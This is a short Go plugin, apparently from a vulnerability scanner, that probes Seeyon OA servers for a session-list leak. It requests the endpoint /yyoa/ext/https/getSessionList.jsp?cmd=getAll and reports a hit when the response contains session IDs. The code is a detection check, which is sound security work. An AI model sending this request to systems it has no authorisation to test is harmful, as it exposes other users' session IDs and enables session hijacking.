package seeyon

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"strings"
)

//getSessionList.jsp session 泄露

func GetSessionList(u string) bool {
	if req, err := utils.HttpRequset(u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "sessionID") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon GetSessionList|%s\n", u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"))
			return true
		}
	}
	return false
}
